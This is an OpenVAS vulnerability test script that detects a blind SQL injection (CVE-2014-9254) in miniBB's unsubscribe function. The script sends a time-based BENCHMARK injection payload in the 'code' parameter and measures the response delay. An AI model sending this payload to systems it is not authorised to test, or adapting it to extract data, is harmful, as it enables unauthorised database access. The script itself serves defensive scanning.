###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_minibb_blind_sql_inj_vuln_jan15.nasl 11873 2018-10-12 11:25:39Z cfischer $
#
# miniBB bb_func_unsub.php 'code' Parameter Blind SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805119");
  script_version("$Revision: 11873 $");
  script_cve_id("CVE-2014-9254");
  script_bugtraq_id(71805);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:25:39 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-01-07 13:19:25 +0530 (Wed, 07 Jan 2015)");
  script_name("miniBB bb_func_unsub.php 'code' Parameter Blind SQL Injection Vulnerability");

  script_tag(name:"summary", value:"The host is installed with miniBB
  and is prone to sql injection vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Flaw is due to the bb_func_unsub.php script
  not properly sanitizing user-supplied input to the 'code' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"MiniBB version 3.1 before 20141127");

  script_tag(name:"solution", value:"Update to version 3.1 released on
  2014-11-27.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://secunia.com/advisories/61794");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/129672");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_xref(name:"URL", value:"http://www.minibb.com");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

wait_extra_sec = 5;

http_port = get_http_port(default:80);
if(!can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/minibb", "/forum", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  sndReq = http_get(item:string(dir, "/bb_admin.php"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if("miniBB" >< rcvRes && ">Username<" >< rcvRes)
  {
    ## Added three times, to make sure its working properly
    sleep = make_list(15000000, 25000000);

    ## Use sleep time to check we are able to execute command
    foreach sec (sleep)
    {
      url = dir + "/index.php?action=unsubscribe&usrid=1&topic=1&code=test%27%20AND%207688"
                + "=BENCHMARK(" + sec + ",MD5(0x54564748))%20AND%20%27YIUP%27=%27YIUP";

      sndReq = http_get(item:url,  port:http_port);

      start = unixtime();
      rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
      stop = unixtime();

      time_taken = stop - start;
      sec = sec / 5000000;

      if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(0);
    }
    security_message(port:http_port);
    exit(0);
  }
}

exit(99);
